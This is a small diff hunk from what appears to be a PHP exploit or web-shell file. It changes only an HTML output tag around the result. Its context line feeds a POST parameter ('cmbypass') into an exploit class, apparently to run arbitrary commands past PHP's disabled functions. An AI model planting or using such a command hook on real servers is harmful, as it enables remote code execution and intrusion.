@@ -13,7 +13,7 @@
 # Author: https://github.com/mm0r1
 
 
-echo "><code>";
+echo "<pre><code>";
 new Pwn($_POST['cmbypass']);
 echo "</code></pre>";
 
